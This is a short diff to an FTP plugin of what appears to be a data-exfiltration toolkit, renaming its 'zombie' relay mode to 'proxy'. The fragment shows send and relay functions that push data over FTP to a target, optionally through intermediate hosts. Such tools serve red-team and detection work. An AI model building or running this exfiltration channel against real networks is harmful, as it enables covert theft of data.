@@ -26,8 +26,8 @@ class CustomFTPHandler(FTPHandler):
         return path
 
 def send(data):
-    if config.has_key('zombies') and config['zombies'] != [""]:
-        targets = [config['target']] + config['zombies']
+    if config.has_key('proxies') and config['proxies'] != [""]:
+        targets = [config['target']] + config['proxies']
         target = choice(targets)
     else:
         target = config['target']
@@ -47,7 +47,7 @@ def send(data):
 def relay_ftp_mkdir(data):
     target = config['target']
     port = config['port']
-    app_exfiltrate.log_message('info', "[zombie] [ftp] Relaying MKDIR query to {}".format(target))
+    app_exfiltrate.log_message('info', "[proxy] [ftp] Relaying MKDIR query to {}".format(target))
     try:
         ftp = FTP()
         ftp.connect(target, port)
@@ -75,8 +75,8 @@ def listen():
     app_exfiltrate.log_message('info', "[ftp] Listening for FTP requests")
     init_ftp("retrieve")
 
-def zombie():
-    app_exfiltrate.log_message('info', "[zombie] [ftp] Listening for FTP requests")
+def proxy():
+    app_exfiltrate.log_message('info', "[proxy] [ftp] Listening for FTP requests")
     init_ftp("relay")
 
 class Plugin:
@@ -85,4 +85,4 @@ class Plugin:
         global app_exfiltrate, config
         app_exfiltrate = app
         config = conf
-        app.register_plugin('ftp', {'send': send, 'listen': listen, 'zombie': zombie})
+        app.register_plugin('ftp', {'send': send, 'listen': listen, 'proxy': proxy})
